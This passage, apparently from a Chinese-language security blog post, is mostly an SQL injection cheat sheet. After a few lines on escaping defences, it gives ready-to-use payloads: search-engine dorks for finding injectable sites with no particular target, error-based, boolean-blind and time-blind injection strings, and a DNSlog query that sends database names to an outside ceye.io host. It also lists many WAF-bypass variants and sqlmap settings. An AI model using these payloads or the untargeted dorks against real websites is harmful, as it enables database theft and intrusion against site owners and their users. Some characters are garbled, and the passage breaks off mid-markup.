<p>2、转义字符。主要就是对输入所包含的特殊字符进行转义，如 <code>&lt;</code>，<code>&gt;</code>，<code>&amp;</code>，<code>&quot;</code>，<code>&#39;</code>，来防止 XSS 攻击。</p>
<p>3、过滤</p>
<p>4、白名单</p>
<h1 id="附上"><a href="#附上" class="headerlink" title="附上"></a>附上</h1><h2 id="一、MySql注入常用函数"><a href="#一、MySql注入常用函数" class="headerlink" title="一、MySql注入常用函数"></a>一、MySql注入常用函数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br></pre></td><td class="code"><pre><span class="line">一、MySql注入常用函数</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、<span class="built_in">system_user</span>()系统用户名</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、<span class="keyword">user</span>()用户名</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、<span class="built_in">current_user</span>()当前用户名</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、<span class="built_in">session_user</span>()链接数据库的用户名</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、database()数据库名</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、version()数据库版本</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、@<span class="variable">@datadir</span>数据库路径</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、@<span class="variable">@basedir</span>数据库安装路径</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、@<span class="variable">@version</span>_conpile_os操作系统</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、<span class="built_in">count</span>()返回执行结果数量</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>、concat()没有分隔符的链接字符串</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>、concat_ws()含有分隔符的连接字符串</span><br><span class="line"></span><br><span class="line"><span class="number">13</span>、group_concat()连接一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>、load_file()读取本地文件</span><br><span class="line"></span><br><span class="line"><span class="number">15</span>、<span class="keyword">into</span> outfile 写文件</span><br><span class="line"></span><br><span class="line"><span class="number">16</span>、ascii()字符串的ASCII代码值</span><br><span class="line"></span><br><span class="line"><span class="number">17</span>ord()返回字符串第一个字符的ASCII值</span><br><span class="line"></span><br><span class="line"><span class="number">18</span>mid()返回一个字符串的一部分</span><br><span class="line"></span><br><span class="line"><span class="number">19</span>substr()返回一个字符串的一部分</span><br><span class="line"></span><br><span class="line"><span class="number">20</span>、length()返回字符串的长度</span><br><span class="line"></span><br><span class="line"><span class="number">21</span>、<span class="keyword">left</span>()返回字符串最左面几个字符</span><br><span class="line"></span><br><span class="line"><span class="number">22</span>、<span class="built_in">floor</span>()返回小于或等于x的最大整数</span><br><span class="line"></span><br><span class="line"><span class="number">23</span>、rand()返回<span class="number">0</span>和<span class="number">1</span>之间的一个随机数</span><br><span class="line"></span><br><span class="line"><span class="number">24</span>、extractvalue()</span><br><span class="line"></span><br><span class="line">第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line"></span><br><span class="line">第二个参数：XPath_string(Xpath格式的字符串)</span><br><span class="line"></span><br><span class="line">作用：从目标XML中返回包含所查询值的字符串</span><br><span class="line"></span><br><span class="line"><span class="number">25</span>、updatexml()</span><br><span class="line"></span><br><span class="line">第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line"></span><br><span class="line">第二个参数：Xpath_string(Xpath格式的字符串)</span><br><span class="line"></span><br><span class="line">第三个参数:new_value,String格式，替换查找到的符合条件的数据target.com</span><br><span class="line"></span><br><span class="line">作用:改变文档中符合条件的节点的值</span><br><span class="line"></span><br><span class="line"><span class="number">26</span>、sleep()让此语句运行N秒钟</span><br><span class="line"></span><br><span class="line"><span class="number">27</span>、if() <span class="keyword">SELECT</span> IF(<span class="number">1</span><span class="operator">&gt;</span><span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>) ; <span class="comment">--&gt;3</span></span><br><span class="line"></span><br><span class="line"><span class="number">28</span>、<span class="type">char</span>()返回整数ASCII代码字符组成的字符串</span><br><span class="line"></span><br><span class="line"><span class="number">29</span>、strcmp()比较字符串内容</span><br><span class="line"></span><br><span class="line"><span class="number">30</span>、ifnull() 假如参数<span class="number">1</span>不为<span class="keyword">NULL</span>，则返回值为参数<span class="number">1</span>，否则其返回值为参数<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">31</span>exp()返回e的x次方</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二、目标搜集</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、无特定目标：inurl:.php?id<span class="operator">=</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、有特定目标：inurl:php?id<span class="operator">=</span> site:</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、工具爬取：spider,对搜索引擎和目标网站的链接进行爬取</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">三、注入识别</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、手工简单识别:</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and 1=1/and 1=2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">/</span><span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and 1like 1/and 1like 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、工具识别：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sqlmap -m filename(filename中保存检测目标)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sqlmap --crawl(sqlmap对目标网站进行爬取，然后一次进行测试)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3、高级识别</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">扩展识别广度和深度:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SqlMap --level 增加测试级别，对header中相关参数也进行测试</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sqlmap -r filename(filename中为网站请求数据)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用工具识别提高效率</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">BurpSuite+Sqlmap</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">BurpSuite拦截所有浏览器访问提交的数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">BurpSuite扩展插件，直接调用SqlMap进行测试一些Tips</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可以在参数后键入&quot;*&quot;来确定想要测试的参数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">可能出现的点：新闻、登录、搜索、留言</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">站在开发的角度去寻找</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">四、报错注入方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1、floor() :select count(*) from information_schema.tables group by concat((select</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、version()),floor(rand(0)*2));https://github.com/ADOOO/Dnslogsqlinj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3、group by会对rand()函数进行操作时产生错误</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4、concat:连接字符串功能</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5、floor:取float的整数值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6、rand:取0~1之间随机浮点值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7、group by:根据一个或多个列对结果集进行分组并有排序功能</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">8、extractvalue():extractvalue(1,concat(0x7e,(select user()),0x7e));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">9、updatexml():select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">五、布尔盲注</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1、left()函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">left(database(),1)&gt;&#x27;</span>s<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">database()显示数据库名称,leȨ(a,b)从左侧截取a的前b位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、regexp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select user() regexp&#x27;</span><span class="operator">^</span>r<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">正则表达式的用法user()结果为root,regexp为匹配root的正则表达式</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3、like</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select user() like&#x27;</span><span class="operator">^</span>ro<span class="operator">%</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">与regexp类似，使用like进行匹配</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4、substr()函数 ascii()函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数 ascii(substr((select database()),1,1))&lt;&gt;98</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5、ord()函数 mid()函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ord(mid((select user()),1,1))=114</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii(),将字符转为ascii值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">六、时间盲注</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(left(user(),1)=&#x27;</span>a<span class="string">&#x27;,0,sleep(3));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">七、DNSlog注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT LOAD_FILE(CONCAT(&#x27;</span>\\\\<span class="string">&#x27;,select database(),&#x27;</span>.mysql.r4ourp.ceye.io\\abc<span class="string">&#x27;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">八、宽字节注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1、在注入点后键入%df,然后按照正常的诸如流程开始注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2、黑盒测试：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在可能的注入点后键入%df,之后进行注入测试</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3、白盒测试：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看MySql编码是否为GBK</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">是否使用preg_replace把单引号替换成\&#x27;</span></span><br><span class="line"></span><br><span class="line">是否使用addslashes进行转义</span><br><span class="line"></span><br><span class="line">是否使用mysql_real_escape_string进行转义</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、防止宽字节注入</span><br><span class="line"></span><br><span class="line">使用utf<span class="number">-8</span>,避免宽字节注入</span><br><span class="line"></span><br><span class="line">ps:不仅在gbk,韩文、日文等等都是宽字节，都很有可能存在宽字节注入漏洞</span><br><span class="line"></span><br><span class="line">mysql_real_escape_string,mysql_set_charset(<span class="string">&#x27;gbk&#x27;</span>,$conn);</span><br><span class="line"></span><br><span class="line">设置参数，character_set_client<span class="operator">=</span><span class="type">binary</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">九、二次编码</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、在注入点后键入<span class="operator">%</span><span class="number">2527</span>,然后按照正常的注入流程开始注入</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、黑盒测试：</span><br><span class="line"></span><br><span class="line">在可能的注入点后键入<span class="operator">%</span><span class="number">2527</span>,之后进行注入测试</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、白盒测试</span><br><span class="line"></span><br><span class="line">是否使用urldecode函数</span><br><span class="line"></span><br><span class="line">urldecode函数是否存在转义方法之后</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">十、二次注入</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、插入恶意数据</span><br><span class="line"></span><br><span class="line">第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，再写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、引用恶意数据</span><br><span class="line"></span><br><span class="line">在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了而已数据，没有进行进一步的检验和处理，这样就会造成<span class="keyword">SQL</span>的二次注入。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、二次注入防御：</span><br><span class="line"></span><br><span class="line">对外部提交的数据，需要更加谨慎的对待。</span><br><span class="line"></span><br><span class="line">程序内部的数据调用，也要严格的进行检查，一旦不小心，测试者就能将特定了<span class="keyword">SQL</span>语句带入到查询当中。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">十一、WAF绕过</span><br><span class="line"></span><br><span class="line">熟练掌握MySQL函数和语法使用方法<span class="operator">+</span>深入了解中间件运行处理机制<span class="operator">+</span>了解WAF防护原理及方法<span class="operator">=</span>随心所欲的绕过WAF的保护</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、白盒绕过</span><br><span class="line"></span><br><span class="line">使用了blacklist函数过滤了<span class="string">&#x27;or&#x27;</span>和<span class="string">&#x27;AND&#x27;</span></span><br><span class="line"></span><br><span class="line">大小写变形:<span class="keyword">Or</span>,<span class="keyword">OR</span>,<span class="keyword">oR</span></span><br><span class="line"></span><br><span class="line">等价替换：<span class="keyword">and</span><span class="operator">-</span><span class="operator">&gt;</span><span class="operator">&amp;&amp;</span>,<span class="keyword">or</span><span class="operator">-</span><span class="operator">&gt;</span><span class="operator">||</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、黑盒绕过</span><br><span class="line"></span><br><span class="line">寻找源站<span class="operator">-</span><span class="operator">&gt;</span>针对云WAF</span><br><span class="line"></span><br><span class="line">利用同网段<span class="operator">-</span><span class="operator">&gt;</span>绕过WAF防护区域</span><br><span class="line"></span><br><span class="line">利用边界漏洞<span class="operator">-</span><span class="operator">&gt;</span>绕过WAF防护区域</span><br><span class="line"></span><br><span class="line">资源限制角度绕过WAF</span><br><span class="line"></span><br><span class="line">POST大BODY</span><br><span class="line"></span><br><span class="line">请求方式变换<span class="keyword">GET</span><span class="operator">-</span><span class="operator">&gt;</span>POST</span><br><span class="line"></span><br><span class="line">Content<span class="operator">-</span>Type变换：application<span class="operator">/</span>x<span class="operator">-</span>www<span class="operator">-</span>form<span class="operator">-</span>urlencoded;<span class="operator">-</span><span class="operator">&gt;</span>multipart<span class="operator">/</span>form<span class="operator">-</span>data;</span><br><span class="line"></span><br><span class="line">参数污染</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>注释符绕过</span><br><span class="line"></span><br><span class="line">Level<span class="number">-1</span>:<span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">Level<span class="number">-2</span>:<span class="keyword">union</span><span class="comment">/*aaaa%01bbs*/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">Level<span class="number">-3</span>:<span class="keyword">union</span><span class="comment">/*aaaaaaaaaaaaaaaaaaaaaaa*/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">内联注释:<span class="comment">/*!xxx*/</span></span><br><span class="line"></span><br><span class="line">空白符绕过</span><br><span class="line"></span><br><span class="line">MySQL空白符：<span class="operator">%</span><span class="number">09</span>,<span class="operator">%</span><span class="number">0</span>A,<span class="operator">%</span><span class="number">0</span>B,<span class="operator">%</span><span class="number">0</span>D,<span class="operator">%</span><span class="number">20</span>,<span class="operator">%</span><span class="number">0</span>C,<span class="operator">%</span>A0,<span class="comment">/*XXX*/</span></span><br><span class="line"></span><br><span class="line">正则的空白符:<span class="operator">%</span><span class="number">09</span>,<span class="operator">%</span><span class="number">0</span>A,<span class="operator">%</span><span class="number">0</span>B,<span class="operator">%</span><span class="number">0</span>D,<span class="operator">%</span><span class="number">20</span></span><br><span class="line"></span><br><span class="line">Example<span class="number">-1</span>:<span class="keyword">union</span><span class="operator">%</span><span class="number">250</span>Cselect</span><br><span class="line"></span><br><span class="line">Example<span class="number">-2</span>:<span class="keyword">union</span><span class="operator">%</span><span class="number">25</span>A0select</span><br><span class="line"></span><br><span class="line">concat<span class="operator">%</span><span class="number">2520</span>(</span><br><span class="line"></span><br><span class="line">concat<span class="comment">/**/</span>(</span><br><span class="line"></span><br><span class="line">concat<span class="operator">%</span><span class="number">250</span>c(http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>Less<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">concat<span class="operator">%</span><span class="number">25</span>a0(</span><br><span class="line"></span><br><span class="line">浮点数词法解析</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span>\Nunion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">extractvalue(<span class="number">1.</span>concat(<span class="number">0x5c</span>,md5(<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">updatexml(<span class="number">1</span>,concat(<span class="number">0x5d</span>,md5(<span class="number">3</span>))),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">GeometryCollection((<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span>@<span class="variable">@version</span>)f)x))</span><br><span class="line"></span><br><span class="line">polygon((<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> name_const(version(),<span class="number">1</span>))x))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line"></span><br><span class="line">MySQL特殊语法</span><br><span class="line"></span><br><span class="line">select&#123;x table_name&#125;from&#123;x information_schema.tables&#125;;</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、Fuzz绕过</span><br><span class="line"></span><br><span class="line">注释符绕过</span><br><span class="line"></span><br><span class="line">最基本的:<span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">中间引入特殊字:<span class="keyword">union</span><span class="comment">/*aaa%0abbs*/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">最后测试注释长度:<span class="keyword">union</span><span class="comment">/*aaaaaaaaaaaaaaa*/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">最基本的模式:<span class="keyword">union</span><span class="comment">/*something*/</span><span class="keyword">select</span></span><br><span class="line"></span><br><span class="line">a1<span class="operator">%</span><span class="operator">!</span><span class="operator">%</span><span class="number">2</span>f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">十二、sqlmap的conf</span><br><span class="line"></span><br><span class="line">sqlmap.py <span class="operator">-</span>v3(主函数入口)</span><br><span class="line"></span><br><span class="line"><span class="comment">--user-agent=websecurity(请求扩充)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--threads=5(访问优化)</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span>p id注入配置</span><br><span class="line"></span><br><span class="line"><span class="comment">--level 3（检测配置）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique=E(注入技术)</span></span><br><span 